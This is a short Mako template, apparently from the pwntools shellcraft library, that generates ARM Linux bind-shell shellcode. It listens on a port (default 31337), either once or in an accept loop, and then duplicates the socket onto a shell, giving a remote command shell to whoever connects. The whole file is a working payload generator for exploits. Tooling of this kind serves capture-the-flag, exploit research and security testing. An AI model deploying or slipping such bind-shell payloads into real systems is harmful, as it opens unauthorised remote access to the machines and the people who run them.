<% from pwnlib.shellcraft import arm, common %>
<%page args="port=31337, sock='r0', once=True"/>
<%docstring>
	binds on specific port with dupsh().

	Args:
		port (int/str)        : specific port (default: 31337)
		sock (int/str/imm/reg): specific socket descriptor (default: 'r0')
		once (boolean)        : if true then runs only one time
</%docstring>

%if once == True:
    ${arm.linux.listen(port)}
%endif

%if once == False:
    ${arm.linux.acceptloop(port)}
%endif

${arm.linux.dupsh(sock)}
